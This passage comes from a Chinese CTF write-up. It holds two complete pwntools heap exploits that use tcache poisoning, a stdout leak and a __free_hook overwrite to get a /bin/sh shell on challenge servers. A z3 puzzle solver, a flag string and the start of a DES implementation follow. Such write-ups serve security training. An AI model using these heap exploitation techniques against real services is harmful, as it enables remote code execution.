        p.sendlineafter('index: ', str(idx))
    def exploit(host, port=40002):
        global p
        if host:
            p = remote(host, port)
        else:
            p = process('./pwn', env={'LD_PRELOAD':'./libc.so.6'})
            gdb.attach(p, 'source ./gdb.script')
        add('A'*0x60) #0
        add('A'*0x60) #1
        free(1)
        edit(0, p64(0x4040b0-3))
        add('1'*0x60) #1
        add('\x00'*0x60) #0
        edit(0, '\x77'*3 + p64(elf.got['free']) + p64(0) + p64(0x4040b8) + p64(0x4040b8) + '/bin/sh\x00')
        show(0)
        libc.address = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - libc.sym['free']
        info('libc.address @ '+hex(libc.address))
        edit(0, p64(libc.sym['system']))
        add('/bin/sh')
        free(1)
        p.interactive()
    if __name__ == '__main__':
        elf = ELF('./pwn')
        libc = ELF('./libc.so.6')
        exploit(args['REMOTE'])
### bms
通过double
free来检测远程libc版本>=2.26，pwnable.tw的heap_paradise原题，但是libc版本不同，利用思路相同，修改_IO_2_1_stdout_的头部造成泄露，再通过tcache
attack来达到任意写
    from pwn import *
    def auth(p):
        p.sendlineafter('name:', 'admin')
        p.sendlineafter('word:', 'frame')
    def __add__(p, name, size, desc):
        p.sendlineafter('>', '1')
        p.sendafter(':', name)
        p.sendafter(':', str(size))
        p.sendafter('description:', desc)
    def __free__(p, idx):
        p.sendlineafter('>', '2')
        p.sendafter(':', str(idx))
    def exploit(host, port=40001):
        if host:
            p = remote(host, port)
        else:
            p = process('./pwn', env={'LD_PRELOAD':libc_name})
            gdb.attach(p, 'source ./gdb.script')
        auth(p)
        add = lambda x,y,z: __add__(p, x, y, z)
        free = lambda x: __free__(p, x)
        add('0', 0x60, 'desc') #0
        free(0)
        free(0)
        add('1', 0x60, p64(0x602020)) #1
        add('2', 0x60, 'desc') #2
        add('3', 0x60, '\x20')
        add('4', 0x60, p64(0xfbad1800) + p64(0)*3 + '\x00')
        p.recv(24)
        libc.address = u64(p.recv(8)) - 0x3d73e0 # - 0x74d0
        info('libc.address @ '+hex(libc.address))
        add('5', 0x90, 'desc')
        free(5)
        free(5)
        add('6', 0x90, p64(libc.sym['__free_hook']))
        add('7', 0x90, '/bin/sh\x00')
        add('8', 0x90, p64(libc.sym['system']))
        free(7)
        p.interactive()
    if __name__ == '__main__':
        # libc_name = './libc.so.6'
        libc_name = './libc6_2.26-0ubuntu2_amd64.so'
        libc = ELF(libc_name)
        exploit(args['REMOTE'])
## Crypto
### puzzles
    from z3 import *
    a1 = Real("a1")
    a2 = Real("a2")
    a3 = Real("a3")
    a4 = Real("a4")
    s = Solver()
    s.add(13627*a1+26183*a2+35897*a3+48119*a4 == 347561292)
    s.add(23027*a1+38459*a2+40351*a3+19961*a4 == 361760202)
    s.add(36013*a1+45589*a2+17029*a3+27823*a4 == 397301762)
    s.add(43189*a1+12269*a2+21587*a3+33721*a4 == 350830412)
    print s.check()
    m = s.model()
    print(m)
part1  
part2高数在线微积分网站  
part3&&part4  
大物和三重积分
得  
flag{01924dd7-1e14-48d0-9d80-fa6bed9c7a00}
### part_des
题目给出了全部的round key 和 某一轮加密的结果  
github 搜一个des的代码 把round key 赋入. 并且遍历某round 把加密结果替换
    # -*- coding: utf-8 -*-    # S盒 的置换矩阵
    S_MATRIX = [(14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
          0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
          4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
          15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13),
         (15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
          3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
          0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
          13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9),
         (10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
          13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
          13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
          1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12),
         (7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
          13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
          10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
          3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14),
         (2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
          14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
          4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
          11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3),
         (12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
          10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
          9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
          4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13),
         (4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
          13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
          1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
          6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12),
         (13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
          1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
          7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
          2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11)]
    # P置换的置换矩阵
    P_MATRIX = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,
                  2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]
    # IP置换的 置换矩阵
    IP_MATRIX = [58, 50, 42, 34, 26, 18, 10, 2,
               60, 52, 44, 36, 28, 20, 12, 4,
               62, 54, 46, 38, 30, 22, 14, 6,
               64, 56, 48, 40, 32, 24, 16, 8,
               57, 49, 41, 33, 25, 17, 9, 1,
               59, 51, 43, 35, 27, 19, 11, 3,
               61, 53, 45, 37, 29, 21, 13, 5,
               63, 55, 47, 39, 31, 23, 15, 7]
    # 压缩置换矩阵  从56位里选48位
    COMPRESS_MATRIXS = [14, 17, 11, 24, 1, 5,
                  3, 28, 15, 6, 21, 10,
                  23, 19, 12, 4, 26, 8,
                  16, 7, 27, 20, 13, 2,
                  41, 52, 31, 37, 47, 55,
                  30, 40, 51, 45, 33, 48,
                  44, 49, 39, 56, 34, 53,
                  46, 42, 50, 36, 29, 32]
    # E扩展置换矩阵
    E_MATRIX = [32, 1, 2, 3, 4, 5,
             4, 5, 6, 7, 8, 9,
             8, 9, 10, 11, 12, 13,
             12, 13, 14, 15, 16, 17,
             16, 17, 18, 19, 20, 21,
             20, 21, 22, 23, 24, 25,
             24, 25, 26, 27, 28, 29,
             28, 29, 30, 31, 32, 1]
    # IP逆置换矩阵
    IP_INVERSE_MATRIX = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
            38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
            36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
            34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]
    # IP置换
    def IP(Mingwen):
        #如果长度不是64 就退出
        assert len(Mingwen) == 64
        ret = ""
        #通过循环 进行IP置换
        for i in IP_MATRIX:
            ret = ret + Mingwen[i - 1]
        return ret
    # 循环左移位数
    def shift(str, shift_count):
        try:
            if len(str) > 28:
                raise NameError
        except TypeError:
            pass
        str = str[shift_count:] + str[0:shift_count]
        return str
    #由密钥 得到子密钥
    def createSubkey(key):
        # 如果key长度不是64 就退出
        assert len(key) == 64
        #DES的密钥由64位减至56位，每个字节的第8位作为奇偶校验位
        #把56位 变成 2个28位